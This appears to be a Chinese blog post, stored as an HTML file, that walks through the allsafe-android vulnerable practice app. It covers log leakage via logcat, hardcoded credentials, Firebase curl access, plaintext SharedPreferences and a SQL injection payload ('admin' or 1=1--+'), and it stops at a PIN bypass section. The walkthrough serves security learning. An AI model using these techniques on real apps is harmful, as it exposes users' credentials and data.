@@ -1,0 +1,944 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/candy.png">
+  <link rel="icon" href="/img/candy.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#1b1b26">
+  <meta name="author" content="Candy">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="1 Insecure Logging(不安全的日志记录)1.1 漏洞复现1234adb shellps -ef | grep &#x27;allsafe&#x27;pidof infosecadventures.allsafelogcat --pid 2153 | grep secret    1.2 漏洞总结对于该类型的 Android 漏洞挖掘，个人的感觉可以在一些的 app 操作之后将 ap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="allsafe-android靶场">
+<meta property="og:url" content="http://candyb0x.github.io/2025/09/27/allsafe-android%E9%9D%B6%E5%9C%BA/index.html">
+<meta property="og:site_name" content="Welcome Candy Box">
+<meta property="og:description" content="1 Insecure Logging(不安全的日志记录)1.1 漏洞复现1234adb shellps -ef | grep &#x27;allsafe&#x27;pidof infosecadventures.allsafelogcat --pid 2153 | grep secret    1.2 漏洞总结对于该类型的 Android 漏洞挖掘，个人的感觉可以在一些的 app 操作之后将 ap">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757794347704-2ca73a21-924b-45d8-ac90-8b8fe76dc2af.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757794339499-09d15288-c026-4ca9-bef2-935920e838d4.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757794689432-31ee2536-cb3d-4533-8751-c21e3e85d3f2.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757794749341-56793fc3-75c4-4e9f-935c-f3e97e78e021.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757796567647-27a216c6-1804-4c51-89d7-e155e9cc0a09.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757797864827-019639c8-8ed9-474e-b055-6ec5fcc2c976.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757798214197-a9fe6cae-e78e-450d-b237-011cbd005a21.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757798234836-d6cc1ae0-2e0b-442d-9770-399639f4a5fa.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757798253589-6e53bb48-7d7b-43e0-9964-c210a41be2b8.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757798717273-8e52c88c-0021-4476-a4f2-09f4accc84f8.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757825450212-8839d2d8-0688-4b19-a2d6-21439db2ff3e.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757825616704-1eee4512-7dea-422a-b53f-536d64b330d9.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757840796151-0861c4dc-7370-4dc7-97fc-bd0324c4c73e.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757840944021-68cef9cf-c705-4e66-b259-ec810621a53c.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757841691671-c2d3c550-5443-44d3-8755-a795a3fd9c8e.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757847020690-bebb42f6-4e6f-4e22-b84d-7235960975b5.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757860031205-6f411c70-7a25-4980-a475-f333fc1abfa9.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757860059305-8836abdf-a660-495e-aba5-d3cc7b8687b0.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758546267445-1460b1fe-222b-4e08-9cd5-2a9f8019a652.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758546325277-3a023c5e-b189-432a-9fc3-ea2465b59a1c.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758546683216-ec611c37-5a60-4174-8f4f-c9e81467c66c.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758546940083-bb539cac-7987-4907-85fc-0806bffcf9ab.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758547742839-91634496-cc08-4ed5-be93-7b63d6dd73b9.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758548244621-66da5145-cebc-4509-bf8a-bc83eed7a672.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758549659528-cf7571fa-b5e1-4537-83a8-893ed6e112e8.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758636812329-ad9a2e5e-bb8d-46ff-bc0a-68b003f6ffee.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758636753329-5a9c439a-6ca1-4365-89a1-1352761363a9.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758637444312-46606fdd-4a73-42cd-9195-caebf61ac51f.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758637844357-b992290b-6f32-43be-8a2e-3d746dd8fda0.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758785889527-3df75771-ea0a-4219-8af8-28be7c85e154.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758786899957-7e384f34-c172-4c42-a6fd-607cf04b676b.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758781541713-3f06abb2-f0c7-4601-922b-0d7bb5a3f916.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758781562218-58bc0399-06b6-4b02-a3b7-97bf5a2be778.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758781663165-2a1b0278-0179-435f-acb6-faff40bf357d.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758781798950-3e9ba323-6253-4889-857d-541b933751a1.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758782685063-589241ba-2fc9-43bb-91f6-00b6c188d51b.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758788845889-1dc7e107-637f-43c1-8b74-243a4ca269ea.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758788923162-1063d8fa-2426-48ca-bd54-b8b53c2c11e8.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758793515297-ed14fa46-dcbe-4f21-a91f-a98e89f2b1f5.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758801864587-23fd4f35-e47c-4294-8fc7-86dcb2efe253.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758801968404-634f1cea-caa1-4092-a2a6-590e96988eab.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758802078559-b453d3eb-dbdb-4960-bcf6-2fbc57480529.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758808834690-f0e4a781-893c-4b4b-bfce-5a25c928b136.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758810190634-af11390a-e555-4958-8779-8d376083a7df.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758810979809-e689ec04-5a68-40f5-8cdc-0b6609864250.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758811796726-01570af2-1970-49c2-90a8-265dc666bfce.png">
+<meta property="article:published_time" content="2025-09-27T08:36:45.000Z">
+<meta property="article:modified_time" content="2025-12-24T13:47:16.895Z">
+<meta property="article:author" content="Candy">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="APK">
+<meta property="article:tag" content="app">
+<meta property="article:tag" content="逆向">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757794347704-2ca73a21-924b-45d8-ac90-8b8fe76dc2af.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>allsafe-android靶场 - Welcome Candy Box</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"candyb0x.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":2},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Candy</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/essay/" target="_self">
+                <i class="iconfont icon-note"></i>
+                <span>随笔</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/Bannerimg.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="allsafe-android靶场"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Candy
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-09-27 16:36" pubdate>
+          2025年9月27日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          47 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">allsafe-android靶场</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="1-Insecure-Logging-不安全的日志记录"><a href="#1-Insecure-Logging-不安全的日志记录" class="headerlink" title="1 Insecure Logging(不安全的日志记录)"></a>1 Insecure Logging(不安全的日志记录)</h1><h2 id="1-1-漏洞复现"><a href="#1-1-漏洞复现" class="headerlink" title="1.1 漏洞复现"></a>1.1 漏洞复现</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">adb shell<br>ps -ef | grep <span class="hljs-string">&#x27;allsafe&#x27;</span><br>pidof infosecadventures.allsafe<br>logcat --pid 2153 | grep secret<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757794347704-2ca73a21-924b-45d8-ac90-8b8fe76dc2af.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757794339499-09d15288-c026-4ca9-bef2-935920e838d4.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="1-2-漏洞总结"><a href="#1-2-漏洞总结" class="headerlink" title="1.2 漏洞总结"></a>1.2 漏洞总结</h2><p>对于该类型的 Android 漏洞挖掘，个人的感觉可以在一些的 app 操作之后将 app 日志进行输出到文件，配合 LLM 等工具进行审计其中是否输出了一些敏感信息然后再进行进一步的判断；</p>
+<h1 id="2-Hardcoded-Credentials-硬编码凭证"><a href="#2-Hardcoded-Credentials-硬编码凭证" class="headerlink" title="2 Hardcoded Credentials(硬编码凭证)"></a>2 Hardcoded Credentials(硬编码凭证)</h1><h2 id="2-1-漏洞复现"><a href="#2-1-漏洞复现" class="headerlink" title="2.1 漏洞复现"></a>2.1 漏洞复现</h2><p>使用<code>jadx</code>工具对 apk 文件进行反编译进行定位关卡代码内容<code>hardcoded</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757794689432-31ee2536-cb3d-4533-8751-c21e3e85d3f2.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>然后在该类中找到了<code>Body</code>变量硬编码的 xml 内容，其中包含了关于用户名和密码的硬编码，即<code>superadmin/supersecurepassword</code>；</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757794749341-56793fc3-75c4-4e9f-935c-f3e97e78e021.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="2-2-漏洞总结"><a href="#2-2-漏洞总结" class="headerlink" title="2.2 漏洞总结"></a>2.2 漏洞总结</h2><p>该类型的漏洞与不安全的日志记录相类似，也是对大量的代码及其信息进行整理判断是否存在敏感信息内容；</p>
+<p>这部分的内容可与不安全的日志记录一并使用 LLM 等工具进行审计；首先通过 LLM 工具对源代码进行审计判断，判断是否存在一些固定日志的输出、硬编码配置、明文密钥等内容；后续将固定日志输出、app 运行日志输出一并输入到 LLM 工具中进行审计获取敏感信息内容。</p>
+<h1 id="3-Firebase-Database-Firebase-数据库"><a href="#3-Firebase-Database-Firebase-数据库" class="headerlink" title="3 Firebase Database(Firebase 数据库)"></a>3 Firebase Database(Firebase 数据库)</h1><h2 id="3-1-漏洞复现"><a href="#3-1-漏洞复现" class="headerlink" title="3.1 漏洞复现"></a>3.1 漏洞复现</h2><p> Firebase Database 一般指 Firebase Realtime Database，它是 Google Firebase 提供的一个 实时的 NoSQL 云数据库。  </p>
+<p>Android 项目使用<code>Firebase Realtime Database</code>入门教程<a target="_blank" rel="noopener" href="https://firebase.google.com/docs/android/setup?hl=zh-cn">https://firebase.google.com/docs/android/setup?hl=zh-cn</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757796567647-27a216c6-1804-4c51-89d7-e155e9cc0a09.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>在这里可以发现基本上都会存在一个<code>google-services.json</code>配置文件</p>
+<p>除此之外，通过信息收集可以指导，对于<code>Firebase Realtime Database</code>存在的一个比较严重的问题就是规则配置不当，从而导致对数据库的任意访问和写入；</p>
+<p>可以用 <code>curl</code> 或任何 HTTP 客户端访问（常用于服务器端脚本或调试）：</p>
+<ul>
+<li>读（公开或使用 <code>auth</code> token）：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">curl &#x27;https://YOUR_DB_NAME.firebaseio.com/users/uid123.json?auth=ID_TOKEN&#x27;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>写（PUT 覆盖；PATCH 部分更新）：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain"># 覆盖写（PUT）<br>curl -X PUT -d &#x27;&#123;&quot;name&quot;:&quot;Alice&quot;,&quot;age&quot;:25&#125;&#x27; &#x27;https://YOUR_DB_NAME.firebaseio.com/users/uid123.json?auth=ID_TOKEN&#x27;<br><br># 部分更新（PATCH）<br>curl -X PATCH -d &#x27;&#123;&quot;age&quot;:26&#125;&#x27; &#x27;https://YOUR_DB_NAME.firebaseio.com/users/uid123.json?auth=ID_TOKEN&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>注意：<code>ID_TOKEN</code> 可以是 Firebase Auth 登录后获取的 token（短时），或是后端服务使用服务帐号签名得到的受限凭证。不要在公众客户端泄露长时有效的服务端密钥。</p>
+<p>通过定位<code>firebaseio.com</code>可以找到相关的 url 地址</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757797864827-019639c8-8ed9-474e-b055-6ec5fcc2c976.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>依次定位可以发现</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757798214197-a9fe6cae-e78e-450d-b237-011cbd005a21.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757798234836-d6cc1ae0-2e0b-442d-9770-399639f4a5fa.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757798253589-6e53bb48-7d7b-43e0-9964-c210a41be2b8.png" srcset="/img/loading.gif" lazyload alt="img"><br>最后发现仅可能的<code>project_id</code>内容，进行尝试可以发现最后的 flag，其实就是一开始搜索<code>firebaseio.com</code>，在 xml 文件中的内容；</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757798717273-8e52c88c-0021-4476-a4f2-09f4accc84f8.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="3-2-漏洞总结"><a href="#3-2-漏洞总结" class="headerlink" title="3.2 漏洞总结"></a>3.2 漏洞总结</h2><p>该类型漏洞有点类似与 web 中的组件配置错误漏洞，本质原因在于引入的组件配置不当导致产生的各种问题，对于这类漏洞问题没有非常好挖掘方法。<br>这类漏洞的发现主要在于自身经验的积累，对组件的熟悉程度，如果对某个组件不了解，不知道它是否存在漏洞，就算看到了也挖不到。</p>
+<h1 id="4-Insecure-Shared-Preferences-不安全的共享首选项"><a href="#4-Insecure-Shared-Preferences-不安全的共享首选项" class="headerlink" title="4 Insecure Shared Preferences(不安全的共享首选项)"></a>4 Insecure Shared Preferences(不安全的共享首选项)</h1><h2 id="4-1-漏洞复现"><a href="#4-1-漏洞复现" class="headerlink" title="4.1 漏洞复现"></a>4.1 漏洞复现</h2><p>Android中的数据持久化存储有多种方案：SharedPreferences、文件存储、SQLite数据库等，其中SharedPreferences适用于存储少量键值对数据，参考 <a target="_blank" rel="noopener" href="https://developer.android.com/training/data-storage/shared-preferences">https://developer.android.com/training/data-storage/shared-preferences</a></p>
+<p>使用SharedPreferences读写数据的代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">SharedPreferences</span> <span class="hljs-variable">sharedPref</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getSharedPreferences(<span class="hljs-string">&quot;test&quot;</span>, Context.MODE_PRIVATE);<br>SharedPreferences.<span class="hljs-type">Editor</span> <span class="hljs-variable">editor</span> <span class="hljs-operator">=</span> sharedPref.edit();<br>editor.putString(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;leixiao&quot;</span>);<br>editor.apply();<br><br>Log.d(TAG,sharedPref.getString(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;null&quot;</span>));<br></code></pre></td></tr></table></figure>
+
+<p>数据会以XML文件形式存储在<code>/data/data/&lt;package_name&gt;/shared_prefs</code>目录 (需要Root权限查看)：</p>
+<p>在获取 SharedPreferences 对象时可以指定模式，当指定为<code>MODE_WORLD_READABLE</code>和<code>MODE_WORLD_WRITEABLE</code>时，其他应用可以对其数据进行读写，将会造成信息泄露和伪造，这两种模式已经在Android 4.2废弃；</p>
+<p>以下是该挑战对应的代码，可以看出采用的是<code>Context.MODE_PRIVATE</code>的模式获取 SharedPreferences 对象，但是采用明文的方式对用户密码进行存储；</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757825450212-8839d2d8-0688-4b19-a2d6-21439db2ff3e.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>因此，我们可以在<code>/data/data/infosecadventures.allsafe/shared_prefs</code>发现我们注册的账户密码，导致严重的信息泄露；</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757825616704-1eee4512-7dea-422a-b53f-536d64b330d9.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="4-2-漏洞总结"><a href="#4-2-漏洞总结" class="headerlink" title="4.2 漏洞总结"></a>4.2 漏洞总结</h2><p>该漏洞的利用场景在于攻击者使用一个相对应的环境让受害者注册账号，并利用该漏洞将受害者注册的用户名和密码进行保存导致严重后果。</p>
+<p>对于该漏洞的挖掘主要关注在数据写入的方式，关注数据是通过什么方式写入服务端或保存在什么位置，观察数据是否存在加密，加密是否存在解密的可能，从这些方面进行漏洞的挖掘。</p>
+<h1 id="5-SQL-Injection-SQL-注入"><a href="#5-SQL-Injection-SQL-注入" class="headerlink" title="5 SQL Injection(SQL 注入)"></a>5 SQL Injection(SQL 注入)</h1><h2 id="5-1-漏洞复现"><a href="#5-1-漏洞复现" class="headerlink" title="5.1 漏洞复现"></a>5.1 漏洞复现</h2><p>通过<code>admin/admin</code>可以发现输出了 admin 账户存储的账户和 md5 hash 的密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757840796151-0861c4dc-7370-4dc7-97fc-bd0324c4c73e.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>尝试盲打 sql 注入<code>admin&#39; or 1=1--+/admin&#39; or 1=1--+</code>，可以发现输出了所有的用户名和 md5 后的密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757840944021-68cef9cf-c705-4e66-b259-ec810621a53c.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>来到源码的内容可以发现存在直接拼接的 sql 语句执行，因此导致的 sql 注入漏洞</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757841691671-c2d3c550-5443-44d3-8755-a795a3fd9c8e.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="5-2-漏洞总结"><a href="#5-2-漏洞总结" class="headerlink" title="5.2 漏洞总结"></a>5.2 漏洞总结</h2><p>该 sql 注入漏洞为本地 SQLite 数据库进行查询，从而导致的 sql 注入漏洞；通过代码审计查询相关的 sql 语句执行位置观察是否存在 sql 注入的可能性。</p>
+<h1 id="6-PIN-Bypass-PIN绕过"><a href="#6-PIN-Bypass-PIN绕过" class="headerlink" title="6 PIN Bypass(PIN绕过)"></a>6 PIN Bypass(PIN绕过)</h1><h2 id="6-1-漏洞复现"><a href="#6-1-漏洞复现" class="headerlink" title="6.1 漏洞复现"></a>6.1 漏洞复现</h2><p>通过漏洞点定位可以发现关键逻辑在<code>checkPin</code>函数中，其对输入的 pin 值与硬编码进行 base64 解码进行判断是否一致。</p>
